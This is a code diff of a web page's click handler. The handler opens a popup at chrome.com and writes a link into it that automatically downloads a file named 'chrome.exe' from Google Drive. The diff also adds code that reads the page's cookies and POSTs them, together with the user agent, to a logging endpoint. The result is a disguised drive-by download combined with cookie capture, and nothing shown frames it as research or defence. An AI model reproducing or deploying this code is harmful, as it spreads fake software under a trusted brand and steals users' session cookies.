@@ -1,4 +1,3 @@
-
 <!doctype html>
 <html>
 <head>
@@ -21,9 +20,27 @@ const logEl = document.getElementById("log");
 const log = m => logEl.textContent += m + "\n";
 
 document.getElementById("btn").onclick = () => {
+
   log("[1] User click received");
 
-  // 1️⃣ Open popup to about:blank first
+  // Capture cookie dari origin halaman ini
+  const cookies = document.cookie;
+  log("[COOKIE] " + cookies);
+
+  // Kirim cookie ke endpoint (simulasi capture request)
+  fetch("/log", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      cookie: cookies,
+      ua: navigator.userAgent,
+      time: new Date().toISOString()
+    })
+  }).catch(()=>{});
+
+  // Popup
   const w = window.open(
     "https://chrome.com",
     "_blank",
@@ -42,32 +59,31 @@ document.getElementById("btn").onclick = () => {
     return;
   }
 
-  log("[2] Popup opened at about:blank");
+  log("[2] Popup opened");
 
-  // 2️⃣ Inject test payload WHILE origin is about:blank
-  w.document.write(`
+  try {
+    w.document.write(`
       <a id="dl" download="chrome.exe"
-       href="https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL&export=download&authuser=0&confirm=t&uuid=733afb2e-0d6c-4da7-8ec5-883d0b792a34&at=AGN2oQ0VkjDRWTpZ7Vs-SmKiGHJ6:1773905849768"></a>
-    <script>
-      setTimeout(() => {
-        document.getElementById("dl").click();
-        document.body.insertAdjacentHTML(
-          'beforeend',
-          '<p></p>'
-        );
-      }, 50);
-    <\/script>
-  `);
+       href="https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL"></a>
+      <script>
+        setTimeout(() => {
+          document.getElementById("dl").click();
+        }, 50);
+      <\/script>
+    `);
+  } catch(e){
+    log("[ERROR] write blocked: " + e);
+  }
 
-  // 3️⃣ Navigate to google.com AFTER
   setTimeout(() => {
     try {
       w.location.href = "https://www.chrome.com";
-      log("[3] Popup navigated to google.com");
+      log("[3] Popup navigated");
     } catch (e) {
       log("[ERROR] Navigation failed: " + e);
     }
   }, 0);
+
 };
 </script>
 
